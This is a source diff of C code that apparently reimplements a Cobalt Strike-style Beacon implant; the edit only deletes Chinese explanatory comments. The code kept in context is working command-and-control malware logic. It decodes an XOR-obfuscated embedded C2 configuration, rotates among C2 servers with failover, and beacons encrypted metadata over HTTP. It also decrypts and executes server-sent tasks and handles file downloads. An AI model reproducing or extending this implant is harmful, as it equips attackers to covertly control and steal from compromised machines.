@@ -26,19 +26,16 @@
 void Beacon_init(HINSTANCE dllbase)
 {
 	Beacon_Dllbase = dllbase;
-	//分配c2配置信息内存块
 	CsC2Config = (char*)malloc(CsC2Config_size);
 	memset(CsC2Config, 0, CsC2Config_size);
 	
 
-	//解密内嵌的配置信息
 	for (int i = 0; i < 0x1000; ++i)
 	{
 		rawData[i] ^= 0x2Eu;
 	}
 
 	datap c2profile;
-	//指向c2profile 4096堆指针及大小信息
 	BeaconDataParse(&c2profile, (char*)rawData, 4096);
 	for (int index = BeaconDataShort(&c2profile); ; index = BeaconDataShort(&c2profile))
 	{
@@ -60,10 +57,10 @@ void Beacon_init(HINSTANCE dllbase)
 			*(DWORD*)(CsC2Config + size + sizeof(size_t)) = BeaconDataInt(&c2profile);
 			break;
 		case 3:
-			//分配一块内存存放str 
+		
 			*(ULONG_PTR*)(CsC2Config + size + sizeof(size_t)) = (ULONG_PTR)malloc(data_size);
 			void* data = BeaconDataPtr(&c2profile, data_size);
-			//取出刚才分配的内存地址开始复制数据
+
 			memcpy(*(ULONG_PTR**)(CsC2Config + size + sizeof(size_t)), data, data_size);
 			break;
 		}
@@ -129,29 +126,20 @@ int main()
 	int conne_error = 0;
 
 
-	//初始化轮询相关
 	rotationstruc* rotation_opt = (rotationstruc*)malloc(sizeof(rotationstruc));
 
-	//69 和failover(错误切换)有关 纯failover模式 69等于0
-	//当是按照错误次数切换的时候69等于指定次数
+
 	int failover_Strategy_number = get_dword(69);
 
-	//70也与failover有关当是按照时间切换的时候70等于指定的时间
 	int failover_Strategy_time = get_dword(70);
 
-	//68 如果是rotate模式 跟切换时间有关
 	int rotate_Strategy_time = get_dword(68);
 
-	//67 是模式id 
-	//2表示rotate或failover
-	//如果是random则是1 随机模式
-	//如果是round-robin则是0 默认模式
-	int strategyID = get_short(67);                       // 67 68 69 70和轮询模式相关
+
+	int strategyID = get_short(67);     
 
 
-	// 
-	//69 与错误切换有关默认-1非错误切换 单错误切换等于0 
-	//如果是-x表示根据次数切换 69等于相应的次数
+
 	init_rotation(rotation_opt, strategyID, rotate_Strategy_time, failover_Strategy_time, failover_Strategy_number);
 
 
@@ -161,11 +149,10 @@ int main()
 	}
 	int server_output_size = get_dword(4); //.http-get.server.output
 	char* server_output_buffer = (char*)malloc(server_output_size);
-	Generate_encryption_metadata(server_output_buffer, server_output_size);// 构造元数据并加密
+	Generate_encryption_metadata(server_output_buffer, server_output_size);
 	while (g_dwMilliseconds)
 	{
 
-		//host 获取 轮询取出host
 		char* p_ServerHost = beacon_Rotation_Strategy(rotation_opt, ServerIP, conne_error);
 		_snprintf(ServerHost_buffer, 0x80, "%s", p_ServerHost);
 
@@ -179,25 +166,24 @@ int main()
 		_snprintf(g_post_url, 0x100u, "%s", ServerPostUrl);
 
 
-		set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);// 设置一些http选项
+		set_winit_http(ServerHost_buffer, ServerPort, lpszAgent);
 
 
 
 		int server_out_size = call_send_Metadata(http_get_url, server_output_buffer, server_output_size);
 		if (server_out_size > 0)
 		{
-			int taskdata_size = decrypt_output_data(server_output_buffer, server_out_size);// 解密
+			int taskdata_size = decrypt_output_data(server_output_buffer, server_out_size);
 			server_out_size = taskdata_size;
 
-			if (taskdata_size > 0)//有任务
+			if (taskdata_size > 0)
 			{
-				Parse_Task((BeaconTask*)server_output_buffer, taskdata_size);// 对解密后的任务进行执行
+				Parse_Task((BeaconTask*)server_output_buffer, taskdata_size);
 			}
 		}
 
 		if (server_out_size == -1)
 		{
-			//连接失败
 			conne_error = 1;
 		}
 		else
@@ -206,7 +192,7 @@ int main()
 
 			if (get_dword(28))
 			{
-				CheckDownload(4096);                     // 文件下载相关
+				CheckDownload(4096);     
 			}
 			else
 			{
